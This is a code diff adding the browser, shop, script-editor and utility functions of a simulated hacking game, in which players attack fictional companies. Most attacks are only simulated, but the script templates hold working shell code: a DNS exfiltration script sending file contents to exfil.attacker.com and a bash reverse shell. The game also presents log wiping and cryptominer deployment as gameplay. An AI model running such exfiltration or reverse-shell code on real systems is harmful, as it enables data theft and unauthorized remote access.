+      about:'<div class="ssec"><h3>About</h3><p>Private defense contractor. Classified programs. ISO 27001 · CMMC Level 3.</p></div>',
+      contracts:'<div class="ssec"><div class="salert warn">⚠ Contract data classified. Requires ITAR clearance.</div></div>',
+      careers:'<div class="ssec"><h3>Careers</h3><p>TS/SCI clearance required for most positions. careers [at] sentinel-ds.com</p></div>',
+      contact:'<div class="ssec"><h3>Contact</h3><p>security [at] sentinel-ds.com</p></div>',
+      portal:loggedIn?'<div class="ssec"><div class="salert ok">✓ Authenticated</div><h3>Classified Systems Portal</h3></div>':'<div class="ssec"><h3>Secure Access <span class="vi vi-auth">AUTH</span></h3><div class="sform"><label>Username</label><input id="sd-u" autocomplete="off" autocorrect="off" autocapitalize="off"><label>Password</label><input id="sd-p" type="password"><label>MFA Token</label><input id="sd-m" placeholder="000000"><button class="fbtn" id="sd-login">LOGIN</button><div id="sd-lr"></div></div></div>',
+    }
+  };
+
+  var sitePages=pages[coId]||{};
+  var content=sitePages[page]||'<p style="color:var(--textd)">Page not found.</p>';
+  return '<div class="site-wrap">'+
+    '<div class="site-hdr"><div class="site-name">'+co.name+'</div><div class="site-domain">http://'+co.domain+'</div></div>'+
+    '<div class="site-nav" data-site="'+coId+'">'+navItems+'</div>'+
+    content+'</div>';
+}
+
+function browserGo() {
+  var url=document.getElementById('browser-url').value.trim(); if(!url) return;
+  if(url.includes('.onion')||url.includes('darknet')){
+    document.getElementById('browser-body').innerHTML='<div class="site-wrap"><div class="site-hdr"><div class="site-name" style="color:var(--red)">DARKNET MARKET</div></div><div class="ssec"><p style="color:var(--textd)">Balance: \u20BF'+(G?G.credits:0)+'</p><button class="fbtn" id="ds-btn">OPEN SHOP</button></div></div>';
+    document.getElementById('ds-btn').addEventListener('click',openShopModal);
+    return;
+  }
+  var co=COMPANIES.find(function(c){return url.includes(c.domain)||url.includes(c.ip);});
+  if(!co||!G||G.discovered.indexOf(co.id)<0){
+    document.getElementById('browser-body').innerHTML='<div style="padding:20px;color:var(--red)">ERR_CONNECTION_REFUSED<br><span style="font-size:9px;color:var(--textd)">Host not discovered. Run scan/nmap first.</span></div>';
+    return;
+  }
+  curSite=co.id; curPage=co.site.pages[0]||'home';
+  var segs=url.split('/').filter(function(p){return p&&!p.includes('.')&&!p.includes(':');});
+  var pg=segs.pop()||'home';
+  var valid=(co.site.pages||[]).indexOf(pg)>=0?pg:'home';
+  setTimeout(function(){browserLoad(co.id,valid);},200);
+}
+
+function browserLoad(coId,page) {
+  curSite=coId; curPage=page;
+  var co=COMPANIES.find(function(c){return c.id===coId;}); if(!co) return;
+  document.getElementById('browser-url').value='http://'+co.domain+'/'+page;
+  if(G&&G.interceptMode){
+    var req='GET /'+page+' HTTP/1.1\nHost: '+co.domain+'\nCookie: PHPSESSID=a3f921bc847d\nUser-Agent: Mozilla/5.0';
+    document.getElementById('icpt-req').textContent=req;
+    document.getElementById('icpt-edit').value=req;
+  }
+  var body=document.getElementById('browser-body');
+  body.innerHTML=buildSite(coId,page);
+  body.querySelectorAll('[data-pg]').forEach(function(el){el.addEventListener('click',function(){browserLoad(coId,this.getAttribute('data-pg'));});});
+  body.querySelectorAll('[data-load]').forEach(function(el){el.addEventListener('click',function(){var p=this.getAttribute('data-load').split('|');browserLoad(p[0],p[1]);});});
+  body.querySelectorAll('[data-term]').forEach(function(el){el.addEventListener('click',function(){termExec(this.getAttribute('data-term'));switchPane('terminal');});});
+  var pfLogin=document.getElementById('pf-login');
+  if(pfLogin) pfLogin.addEventListener('click',function(){webLogin('c0',document.getElementById('pf-u').value,document.getElementById('pf-p').value,'pf-lr','portal');});
+  var pfApi=document.getElementById('pf-api-btn');
+  if(pfApi) pfApi.addEventListener('click',function(){
+    var id=parseInt(document.getElementById('pf-aid').value)||1;
+    var users=[null,{id:1,username:'admin',role:'admin'},{id:2,username:'marcus.reed',role:'operator'},{id:3,username:'backup',role:'service'}];
+    var u=users[id];
+    var el=document.getElementById('pf-ar');
+    el.style.display='block'; el.textContent=u?JSON.stringify(u,null,2):'{"error":"not found"}';
+    if(u&&id>1) tPrint('ok','[IDOR] Retrieved user '+id+' without auth: '+u.username);
+  });
+  var pfSubmit=document.getElementById('pf-submit');
+  if(pfSubmit) pfSubmit.addEventListener('click',function(){
+    var msg=document.getElementById('pf-cm').value||'';
+    var el=document.getElementById('pf-cr');
+    if(msg.includes(SCRTAG)||msg.includes('javascript:')){
+      el.innerHTML='<div class="salert warn">\u26A0 XSS detected -- script executes when admin views messages</div>';
+      tPrint('warn','[XSS] Stored XSS in contact form confirmed');
+    } else el.innerHTML='<div class="salert ok">Message sent.</div>';
+  });
+  var ngLogin=document.getElementById('ng-login');
+  if(ngLogin) ngLogin.addEventListener('click',function(){webLogin('c1',document.getElementById('ng-u').value,document.getElementById('ng-p').value,'ng-lr','portal');});
+  var afLogin=document.getElementById('af-login');
+  if(afLogin) afLogin.addEventListener('click',function(){webLogin('c2',document.getElementById('af-u').value,document.getElementById('af-p').value,'af-lr','portal');});
+  var cgLogin=document.getElementById('cg-login');
+  if(cgLogin) cgLogin.addEventListener('click',function(){webLogin('c3',document.getElementById('cg-u').value,document.getElementById('cg-p').value,'cg-lr','portal');});
+  var dpLogin=document.getElementById('dp-login');
+  if(dpLogin) dpLogin.addEventListener('click',function(){webLogin('c4',document.getElementById('dp-u').value,document.getElementById('dp-p').value,'dp-lr','portal');});
+  var ocLogin=document.getElementById('oc-login');
+  if(ocLogin) ocLogin.addEventListener('click',function(){webLogin('c5',document.getElementById('oc-u').value,document.getElementById('oc-p').value,'oc-lr','portal');});
+  var sdLogin=document.getElementById('sd-login');
+  if(sdLogin) sdLogin.addEventListener('click',function(){webLogin('c6',document.getElementById('sd-u').value,document.getElementById('sd-p').value,'sd-lr','portal');});
+}
+
+function webLogin(coId,user,pass,resultId,redirect) {
+  var co=COMPANIES.find(function(c){return c.id===coId;}); if(!co) return;
+  var el=document.getElementById(resultId);
+  if(co.creds[user]===pass){
+    if(el) el.innerHTML='<div class="salert ok">\u2713 Login successful</div>';
+    if(!G.pwned[co.id]) G.pwned[co.id]={hasShell:false,hasRoot:false,exfilled:[],persisted:false};
+    G.pwned[co.id].hasShell=true;
+    G.session={connected:true,targetId:co.id,user:user,cwd:'/',isRoot:user==='root'||user==='Administrator'};
+    updatePrompt(); renderFS(); saveGame();
+    setTimeout(function(){browserLoad(coId,redirect||'portal');},700);
+    tPrint('ok','[Browser] Auth as '+user+'@'+co.domain);
+    G.credits += 40; tPrint('ok','[+] Access bonus: +₿40 credits'); renderTopbar();
+  } else {
+    if(el) el.innerHTML='<div class="salert err">\u2717 Invalid credentials</div>';
+    if(user&&user.includes("'")) tPrint('warn','[Browser] SQLi pattern -- try INTERCEPT or exploit sqli');
+  }
+}
+
+function toggleIntercept() {
+  if(!G) return;
+  G.interceptMode=!G.interceptMode;
+  document.getElementById('btn-icpt').classList.toggle('atool',G.interceptMode);
+  document.getElementById('icpt-panel').classList.toggle('active',G.interceptMode);
+}
+function sendModified() {
+  var m=document.getElementById('icpt-edit').value;
+  tPrint('sys','[Intercept] Sending modified request...');
+  if(m.includes("'")&&m.toUpperCase().includes('OR')){tPrint('ok','[+] SQLi detected -- auth bypassed!');toast('[+] SQLi via intercept!');}
+  else if(m.includes(SCRTAG)){tPrint('ok','[+] XSS payload detected');}
+  else tPrint('dim','[Intercept] Request sent.');
+}
+
+function openCurlBuilder() {
+  var co=curSite?COMPANIES.find(function(c){return c.id===curSite;}):null;
+  openModal('cURL BUILDER',
+    '<select id="cm" style="background:#000;border:1px solid var(--border2);color:var(--g);font-family:Share Tech Mono,monospace;font-size:10px;padding:3px;margin-bottom:6px;width:100%"><option>GET</option><option>POST</option><option>PUT</option><option>DELETE</option></select>'+
+    '<label style="font-size:9px;color:var(--textd)">URL</label>'+
+    '<input id="cu" value="http://'+(co?co.domain:'target')+'/login.php" style="background:#000;border:1px solid var(--border2);color:var(--g);font-family:Share Tech Mono,monospace;font-size:10px;padding:4px;width:100%;margin-bottom:5px;outline:none;">'+
+    '<label style="font-size:9px;color:var(--textd)">Headers</label>'+
+    '<textarea id="ch" style="background:#000;border:1px solid var(--border2);color:var(--g);font-family:Share Tech Mono,monospace;font-size:10px;padding:4px;width:100%;height:50px;outline:none;resize:vertical;margin-bottom:5px;" placeholder="X-Forwarded-For: 127.0.0.1"></textarea>'+
+    '<label style="font-size:9px;color:var(--textd)">Body</label>'+
+    '<textarea id="cb" style="background:#000;border:1px solid var(--border2);color:var(--g);font-family:Share Tech Mono,monospace;font-size:10px;padding:4px;width:100%;height:50px;outline:none;resize:vertical;" placeholder="username=admin&amp;password=x"></textarea>'+
+    '<button class="t-btn sm" id="curl-send" style="margin-top:7px">SEND</button>'+
+    '<div id="cr" style="margin-top:7px;font-size:10px;font-family:Share Tech Mono,monospace;color:var(--g);white-space:pre-wrap;"></div>'
+  );
+  document.getElementById('curl-send').addEventListener('click',function(){
+    var body=document.getElementById('cb').value||'',url=document.getElementById('cu').value||'';
+    var resp='HTTP/1.1 200 OK\nServer: Apache/2.2.34\n\n';
+    if(body.includes("'")||body.includes('OR 1=1')) resp+='[SQLi] Auth bypassed -- welcome admin!';
+    else if(body.includes(SCRTAG)) resp+='[XSS] Script executes in victim browser';
+    else if(url.includes('../')) resp+='[LFI] File contents returned';
+    else resp+='[Normal] 200 OK';
+    document.getElementById('cr').textContent=resp;
+  });
+}
+
+function openFuzzer() {
+  if(!curSite){toast('Navigate to a site first','w');return;}
+  var co=COMPANIES.find(function(c){return c.id===curSite;});
+  openModal('FORM FUZZER',
+    '<div style="font-size:10px;color:var(--textd);margin-bottom:7px">Auto-tests input fields for XSS, SQLi, LFI, IDOR.</div>'+
+    '<input id="furl" value="http://'+(co?co.domain:'target')+'/login.php" style="background:#000;border:1px solid var(--border2);color:var(--g);font-family:Share Tech Mono,monospace;font-size:10px;padding:4px;width:100%;margin-bottom:7px;outline:none;">'+
+    '<div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:7px;font-size:9px;color:var(--textd)">'+
+    '<label><input type="checkbox" id="fz-sqli" checked> SQLi</label>'+
+    '<label><input type="checkbox" id="fz-xss" checked> XSS</label>'+
+    '<label><input type="checkbox" id="fz-lfi"> LFI</label>'+
+    '<label><input type="checkbox" id="fz-idor"> IDOR</label></div>'+
+    '<button class="t-btn sm" id="fuzz-run">RUN FUZZER</button>'+
+    '<div id="fres" style="margin-top:9px;font-size:10px;font-family:Share Tech Mono,monospace;"></div>'
+  );
+  document.getElementById('fuzz-run').addEventListener('click',function(){
+    var vulns=co?(co.webVulns||[]):[];
+    var fres=document.getElementById('fres');
+    fres.innerHTML='<span style="color:var(--textd)">[*] Fuzzing...</span>';
+    setTimeout(function(){
+      var checks=[
+        {id:'fz-sqli',label:'SQLi',col:'var(--orange)',found:vulns.indexOf('sqli')>=0},
+        {id:'fz-xss',label:'XSS',col:'var(--purple)',found:vulns.indexOf('xss')>=0},
+        {id:'fz-lfi',label:'LFI',col:'var(--yellow)',found:vulns.indexOf('lfi')>=0},
+        {id:'fz-idor',label:'IDOR',col:'var(--cyan)',found:vulns.indexOf('idor')>=0},
+      ];
+      fres.innerHTML=checks.map(function(c){
+        if(!document.getElementById(c.id)||!document.getElementById(c.id).checked) return '';
+        return c.found?'<div style="color:'+c.col+'">[VULNERABLE] '+c.label+' detected</div>':'<div style="color:var(--textd)">[ CLEAN ] '+c.label+'</div>';
+      }).join('');
+    },1500);
+  });
+}
+
+function openCookies() {
+  openModal('COOKIE INSPECTOR',
+    '<table class="stbl"><tr><th>Name</th><th>Value</th><th>Flags</th></tr>'+
+    '<tr><td>PHPSESSID</td><td>a3f921bc847d</td><td style="color:var(--red)">No HttpOnly</td></tr>'+
+    '<tr><td>user_role</td><td>operator</td><td style="color:var(--red)">No Secure</td></tr>'+
+    '</table>'+
+    '<div style="margin-top:8px;font-size:9px;color:var(--textd)">No HttpOnly = XSS can steal cookie<br>user_role client-side = try changing to "admin"</div>'+
+    '<label style="font-size:9px;color:var(--textd);margin-top:8px;display:block">Edit cookie</label>'+
+    '<input id="ce" value="a3f921bc847d" style="background:#000;border:1px solid var(--border2);color:var(--g);font-family:Share Tech Mono,monospace;font-size:10px;padding:4px;width:100%;margin:3px 0;outline:none;">'+
+    '<button class="t-btn sm" id="cookie-set">SET COOKIE</button>'
+  );
+  document.getElementById('cookie-set').addEventListener('click',function(){toast('Cookie modified');});
+}
+
+function openDiff() {
+  openModal('RESPONSE DIFF VIEWER',
+    '<div style="display:grid;grid-template-columns:1fr 1fr;gap:7px;">'+
+    '<div><div style="font-size:9px;color:var(--textd);margin-bottom:3px">BASELINE</div>'+
+    '<div style="background:#020a02;border:1px solid var(--border);padding:7px;font-size:9px;color:#88bb88;height:130px;overflow-y:auto;font-family:Share Tech Mono,monospace;white-space:pre">HTTP/1.1 200 OK\nContent-Length: 2847\n\n&lt;p&gt;Invalid credentials.&lt;/p&gt;</div></div>'+
+    '<div><div style="font-size:9px;color:var(--orange);margin-bottom:3px">MODIFIED (SQLi)</div>'+
+    '<div style="background:#1a0800;border:1px solid var(--orange);padding:7px;font-size:9px;color:var(--orange);height:130px;overflow-y:auto;font-family:Share Tech Mono,monospace;white-space:pre">HTTP/1.1 200 OK\nContent-Length: 8241\n\n&lt;p&gt;Welcome, admin!&lt;/p&gt;</div></div>'+
+    '</div><div style="margin-top:7px;font-size:9px;color:var(--g)">Diff: +5394 bytes. Different page served \u2192 SQLi confirmed.</div>'
+  );
+}
+
+// ═══════════════════════════ MODALS ═══════════════════════════
+function openModal(title,html) {
+  document.getElementById('modal-title').textContent=title;
+  document.getElementById('modal-body').innerHTML=html;
+  document.getElementById('modal-bg').classList.add('on');
+}
+function closeModal() { document.getElementById('modal-bg').classList.remove('on'); }
+
+function showTargetModal(coId) {
+  var co=COMPANIES.find(function(c){return c.id===coId;}); if(!co) return;
+  var pw=G.pwned[coId]||{},recon=G.reconDone[coId]||{};
+  var html='<div style="margin-bottom:9px"><div style="font-size:14px;color:var(--g);font-family:VT323,monospace">'+co.name+'</div>'+
+    '<div style="font-size:9px;color:var(--textd)">'+co.ip+' \u00B7 '+co.domain+' \u00B7 '+co.industry+'</div></div>'+
+    '<div style="font-size:10px;color:#88bb88;margin-bottom:9px">'+co.desc+'</div>'+
+    '<div style="display:grid;grid-template-columns:1fr 1fr;gap:5px;margin-bottom:9px;font-size:9px;">'+
+    '<div>FW: <span style="color:'+(co.sec.fw?'var(--red)':'var(--g)')+'">'+  (co.sec.fw?'YES':'NO')+'</span></div>'+
+    '<div>IDS: <span style="color:'+(co.sec.ids?'var(--red)':'var(--g)')+'">'+  (co.sec.ids?'YES':'NO')+'</span></div>'+
+    '<div>WAF: <span style="color:'+(co.sec.waf?'var(--red)':'var(--g)')+'">'+  (co.sec.waf?'YES':'NO')+'</span></div>'+
+    '<div>MFA: <span style="color:'+(co.sec.mfa?'var(--red)':'var(--g)')+'">'+  (co.sec.mfa?'YES':'NO')+'</span></div></div>'+
+    '<div style="font-size:9px;color:var(--textd);margin-bottom:3px">RECON:</div>'+
+    '<div style="font-size:9px;margin-bottom:9px">'+
+    ['ping','nmap','gobuster','sniffer'].map(function(r){return '<span style="color:'+(recon[r]?'var(--g)':'var(--textd)')+'>\u25A0 '+r+' </span>';}).join('')+'</div>'+
+    '<div style="font-size:9px;color:var(--textd);margin-bottom:3px">CONTRACTS:</div>'+
+    (co.contracts||[]).map(function(ct){
+      var st=G.contracts[ct.id];
+      return '<div style="font-size:10px;color:'+(st==='complete'?'#00ff88':st==='inactive'?'var(--textd)':'var(--yellow)')+';margin:2px 0">'+
+        (st==='complete'?'\u2713':st==='inactive'?'\uD83D\uDD12':'\u25CF')+' '+ct.title+' \u2014 \u20BF'+ct.reward.c+'+'+ct.reward.r+'REP</div>';
+    }).join('')+
+    '<div style="margin-top:9px;font-size:9px;color:var(--textd)">ATTACK SEQUENCE:</div>'+
+    '<div style="font-size:10px;color:var(--cyan);line-height:2;margin-top:3px;font-family:Share Tech Mono,monospace">'+
+    'scan '+co.ip.split('.').slice(0,3).join('.')+'.0/24<br>nmap -sV -sC '+co.ip+'<br>'+
+    (co.sec.ids?'deploy sniffer '+co.ip+'<br>':'')+
+    'gobuster '+co.ip+'<br>exploit [CVE] '+co.ip+'<br>privesc linpeas \u2192 exfil /root/flag.txt https</div>'+
+    '<div style="display:flex;gap:5px;margin-top:10px;flex-wrap:wrap;">'+
+    '<button class="t-btn sm" id="tm-browse">BROWSE</button>'+
+    '<button class="t-btn sm" id="tm-nmap">NMAP</button>'+
+    '<button class="t-btn sm" id="tm-sniff">SNIFFER</button></div>';
+  openModal('TARGET: '+co.name,html);
+  document.getElementById('tm-browse').addEventListener('click',function(){closeModal();browserLoad(coId,'home');switchPane('browser');});
+  document.getElementById('tm-nmap').addEventListener('click',function(){closeModal();termExec('nmap -sV -sC '+co.ip);switchPane('terminal');});
+  document.getElementById('tm-sniff').addEventListener('click',function(){closeModal();termExec('deploy sniffer '+co.ip);switchPane('terminal');});
+}
+
+function openShopModal() {
+  var cats={network:'\uD83D\uDD17 Network',recon:'\uD83D\uDD0D Recon',exploit:'\uD83D\uDCA5 Exploit',webexpl:'\uD83C\uDF10 Web',post:'\u2699 Post',persist:'\uD83D\uDD17 Persist',exfil:'\uD83D\uDCE4 Exfil',opsec:'\uD83D\uDEE1 OPSEC',mining:'\u26CF Mining'};
+  var html='<div style="font-size:10px;color:var(--textd);margin-bottom:9px">Balance: <span style="color:var(--yellow)">\u20BF'+G.credits+'</span>  REP: <span style="color:var(--g)">'+G.rep+'</span></div>';
+  Object.entries(cats).forEach(function(kv){
+    var cat=kv[0],label=kv[1];
+    var items=SHOP.filter(function(i){return i.cat===cat;}); if(!items.length) return;
+    html+='<div style="font-size:9px;letter-spacing:2px;color:var(--textd);margin:9px 0 5px;border-bottom:1px solid var(--border);padding-bottom:2px">'+label+'</div>';
+    items.forEach(function(item){
+      var owned=G.tools.indexOf(item.id)>=0,can=G.credits>=item.cost.c&&G.rep>=item.cost.r;
+      html+='<div style="display:flex;gap:7px;align-items:flex-start;background:var(--bg2);border:1px solid var(--border);padding:8px;margin-bottom:5px;">'+
+        '<div style="font-size:18px;flex-shrink:0">'+item.icon+'</div>'+
+        '<div style="flex:1"><div style="color:var(--g);font-size:12px;margin-bottom:1px">'+item.name+'</div>'+
+        '<div style="color:var(--textd);font-size:9px;line-height:1.5;margin-bottom:3px">'+item.desc+'</div>'+
+        '<div style="font-size:9px;color:var(--textd)">\u20BF'+item.cost.c+(item.cost.r>0?' \u00B7 '+item.cost.r+' REP':'')+'</div></div>'+
+        (owned?'<button style="padding:4px 8px;background:var(--border);border:1px solid var(--textd);color:var(--textd);font-family:Share Tech Mono,monospace;font-size:9px;cursor:default">OWNED</button>':
+        '<button data-buy="'+item.id+'" style="padding:4px 8px;background:'+(can?'var(--gdim)':'#1a0000')+';border:1px solid '+(can?'var(--g2)':'var(--textdd)')+';color:'+(can?'var(--g)':'var(--textd)')+';font-family:Share Tech Mono,monospace;font-size:9px;cursor:'+(can?'pointer':'not-allowed')+'">'+(can?'BUY':'LOCKED')+'</button>')+
+        '</div>';
+    });
+  });
+  openModal('DARKNET SHOP',html);
+  document.getElementById('modal-body').querySelectorAll('[data-buy]').forEach(function(btn){
+    btn.addEventListener('click',function(){buyTool(this.getAttribute('data-buy'));});
+  });
+}
+
+function buyTool(id) {
+  var item=SHOP.find(function(i){return i.id===id;});
+  if(!item||G.tools.indexOf(id)>=0) return;
+  if(G.credits<item.cost.c){toast('Insufficient credits','e');return;}
+  if(G.rep<item.cost.r){toast('Insufficient REP','e');return;}
+  G.credits-=item.cost.c; G.tools.push(id);
+  saveGame(); renderTopbar(); toast('\u2713 '+item.name+' installed');
+  var wts={metasploit:'[METASPLOIT]\nUnlocks CVE exploitation.\n  nmap -sV -sC <ip>  find vulnerable service\n  exploit <CVE> <ip>  run the exploit',
+    linpeas:'[LINPEAS]\nScans for privesc vectors.\n  privesc linpeas\nFinds: sudo NOPASSWD, SUID, cron, creds in files.',
+    hydra:'[HYDRA]\nBrute-forces logins.\n  brute ssh <ip>\nNoisy -- triggers IDS. Prefer "deploy sniffer" first.',
+    burpsuite:'[BURP SUITE]\nUse INTERCEPT button in browser pane.\nCapture -- Edit -- FORWARD or SEND MODIFIED'};
+  var wt=wts[id.replace('-pro','')];
+  if(wt){switchPane('terminal');wt.split('\n').forEach(function(l){tPrint('dim',l);});}
+  closeModal(); openShopModal();
+}
+
+function openEditorModal() {
+  var templates={
+    'port-scanner':'#!/bin/bash\nTARGET=${1:-192.168.10.14}\nfor port in 21 22 80 443 3306 8080 6379; do\n  (echo >/dev/tcp/$TARGET/$port) 2>/dev/null && echo "[+] $TARGET:$port" || echo "[-] $port"\ndone',
+    'priv-check':'#!/bin/bash\necho "=== SUDO ===" && sudo -l 2>/dev/null\necho "=== SUID ===" && find / -perm -4000 2>/dev/null | head -20\necho "=== CRON ===" && cat /etc/crontab 2>/dev/null',
+    'exfil-dns':'#!/bin/bash\nFILE=$1 DOMAIN=exfil.attacker.com\nDATA=$(base64 "$FILE" | tr -d "\\n")\nfor chunk in $(echo $DATA | fold -w 63); do\n  host "${chunk}.${DOMAIN}" >/dev/null 2>&1\ndone',
+    'rev-shell':'#!/bin/bash\n# Replace IP/PORT\nbash -i >& /dev/tcp/10.0.0.2/4444 0>&1',
+  };
+  if(!G.scripts) G.scripts=[];
+  openModal('SCRIPT EDITOR',
+    '<div style="display:flex;gap:5px;margin-bottom:5px;flex-wrap:wrap;">'+
+    '<select id="et" style="background:#000;border:1px solid var(--border2);color:var(--textd);font-family:Share Tech Mono,monospace;font-size:9px;padding:3px;"><option value="">-- Template --</option>'+
+    Object.keys(templates).map(function(k){return '<option value="'+k+'">'+k+'</option>';}).join('')+'</select>'+
+    '<input id="en" value="my-script" style="background:#000;border:1px solid var(--border2);color:var(--g);font-family:Share Tech Mono,monospace;font-size:10px;padding:3px;flex:1;outline:none;min-width:80px;">'+
+    '<button class="t-btn sm" id="ed-save">SAVE</button>'+
+    '<button class="t-btn sm" id="ed-test">TEST</button></div>'+
+    '<textarea id="ec" spellcheck="false" autocomplete="off" autocorrect="off" autocapitalize="off" style="width:100%;height:180px;background:#000;border:1px solid var(--border2);color:var(--g);font-family:Share Tech Mono,monospace;font-size:11px;padding:7px;outline:none;resize:vertical;line-height:1.6;">#!/bin/bash\necho "Script running"</textarea>'+
+    '<div style="font-size:9px;color:var(--textd);margin-top:5px">Saved: '+G.scripts.length+' scripts \u00B7 Run: run &lt;name&gt;</div>'
+  );
+  document.getElementById('et').addEventListener('change',function(){
+    var v=this.value; if(templates[v]){document.getElementById('ec').value=templates[v];document.getElementById('en').value=v;}
+  });
+  document.getElementById('ed-save').addEventListener('click',function(){
+    var name=(document.getElementById('en').value||'script').replace(/\s/g,'-');
+    var code=document.getElementById('ec').value||'';
+    var idx=G.scripts.findIndex(function(s){return s.name===name;});
+    if(idx>=0) G.scripts[idx]={name:name,code:code}; else G.scripts.push({name:name,code:code});
+    saveGame(); renderFS(); toast('\u2713 Saved: '+name);
+  });
+  document.getElementById('ed-test').addEventListener('click',function(){
+    var code=document.getElementById('ec').value||'';
+    tPrint('sys','[DRY RUN] '+(document.getElementById('en').value||'script'));
+    code.split('\n').filter(function(l){return l.trim()&&!l.trim().startsWith('#');}).slice(0,5).forEach(function(l){tPrint('dim','  '+l);});
+    tPrint('ok','[DRY RUN] Complete.');
+    switchPane('terminal'); closeModal();
+  });
+}
+
+// ═══════════════════════════ PANE SWITCHING ═══════════════════════════
+function switchPane(name) {
+  document.querySelectorAll('.tab').forEach(function(t){t.classList.toggle('on',t.getAttribute('data-pane')===name);});
+  document.querySelectorAll('.pane').forEach(function(p){p.classList.toggle('on',p.id==='pane-'+name);});
+  if(name==='terminal') setTimeout(termFocus,80);
+  if(name==='network') renderNetmap();
+  if(name==='cve') renderCveDb();
+  if(name==='fs') renderFS();
+}
+
+// ═══════════════════════════ TOAST ═══════════════════════════
+function toast(msg,type) {
+  var el=document.createElement('div');
+  el.className='toast'+(type?' '+type:'');
+  el.textContent=msg;
+  document.body.appendChild(el);
+  setTimeout(function(){el.remove();},3000);
+}
+
+// ═══════════════════════════ UTIL ═══════════════════════════
+function cmdClearLogs(args,s,t) {
+  if(G.tools.indexOf('log-cleaner')<0){tPrint('err','[!] Log Cleaner not installed. Buy in shop.');return;}
+  var tgtIp=args[0]||null;
+  if(tgtIp){
+    var co=COMPANIES.find(function(x){return x.ip===tgtIp||x.domain===tgtIp;});
+    if(!co){tPrint('err','Unknown target: '+tgtIp);return;}
+    tPrint('sys','[*] Wiping logs on '+co.domain+'...');
+    after(1200,function(){
+      tPrint('ok','[+] auth.log cleared');
+      tPrint('ok','[+] bash_history wiped');
+      tPrint('ok','[+] syslog truncated');
+      var red=Math.min(G.wanted,2);
+      G.wanted=Math.max(0,G.wanted-red);
+      renderWanted();
+      tPrint('ok','[+] Wanted reduced by '+red.toFixed(1));
+      saveGame();
+    });
+  } else {
+    tPrint('sys','[*] Clearing local traces...');
+    after(800,function(){
+      G.wanted=Math.max(0,G.wanted-1);
+      renderWanted();
+      tPrint('ok','[+] Local traces cleared. Wanted -1.');
+      tPrint('dim','    Tip: clearlogs <ip> wipes remote logs (wanted -2)');
+      saveGame();
+    });
+  }
+}
+
+function cmdRotateIp() {
+  if(G.tools.indexOf('ip-rotator')<0){tPrint('err','[!] IP Rotator not installed. Buy in shop.');return;}
+  tPrint('sys','[*] Rotating attacker IP...');
+  after(1500,function(){
+    var old=G.wanted;
+    G.wanted=Math.max(0,G.wanted-2);
+    renderWanted();
+    tPrint('ok','[+] IP rotated. Traces broken. Wanted: '+old.toFixed(1)+' to '+G.wanted.toFixed(1));
+    tPrint('dim','    TOR Router provides continuous protection vs one-time reset.');
+    saveGame();
+  });
+}
+
+function cmdDeployMiner(ip) {
+  if(G.tools.indexOf('miner')<0){tPrint('err','[!] XMR Miner not installed. Buy in shop.');return;}
+  if(!ip){tPrint('err','Usage: deploy miner <ip>');return;}
+  var co=COMPANIES.find(function(x){return x.ip===ip||x.domain===ip;});
+  if(!co||G.discovered.indexOf(co.id)<0){tPrint('err','Target not discovered.');return;}
+  var pw=G.pwned[co.id]||{};
+  if(!pw.hasRoot){tPrint('err','[!] Root access required. Run privesc first.');return;}
+  if(!G.miners) G.miners={};
+  if(G.miners[co.id]){
+    tPrint('warn','[!] Miner already active on '+co.domain+'. Rate: ₿'+G.miners[co.id].rate+'/tick');
+    return;
+  }
+  tPrint('sys','[*] Deploying XMR miner on '+co.domain+'...');
+  after(1500,function(){
+    var baseRate={easy:8,med:18,hard:35,elite:80}[co.diff]||10;
+    if(G.tools.indexOf('miner-pool')>=0) baseRate=baseRate*2;
+    G.miners[co.id]={domain:co.domain,ip:co.ip,diff:co.diff,rate:baseRate,deployed:Date.now()};
+    tPrint('ok','[+] Miner deployed on '+co.domain);
+    tPrint('ok','[+] Mining rate: ₿'+baseRate+'/30s tick');
+    tPrint('dim','    Run "miners" to view all rigs. Mining Pool doubles all rates.');
+    if(co.sec.ids){riseWanted(0.5);tPrint('warn','[!] IDS may flag CPU spike.');}
+    renderTopbar(); saveGame(); renderNetmap();
+  });
+}
+
+function cmdMiners() {
+  if(!G.miners||!Object.keys(G.miners).length){
+    tPrint('dim','No active miners. Use: deploy miner <ip>  (requires root + miner tool)');
+    return;
+  }
+  tPrint('hdr','ACTIVE MINERS');
+  tPrint('pre','');
+  var total=0;
+  Object.entries(G.miners).forEach(function(kv){
+    var m=kv[1];
+    var poolBonus=G.tools.indexOf('miner-pool')>=0?' [POOL x2]':'';
+    tPrint('ok','  ⛏ '+m.domain+' ('+m.ip+')');
+    tPrint('dim','    Tier: '+m.diff.toUpperCase()+'  Rate: ₿'+m.rate+'/30s'+poolBonus);
+    total+=m.rate;
+  });
+  tPrint('pre','');
+  tPrint('sys','  TOTAL: ₿'+total+' per 30s tick');
+}
+
+function after(ms,fn){setTimeout(fn,ms+Math.floor(Math.random()*150));}
+
+</script>
+</body>
+</html>
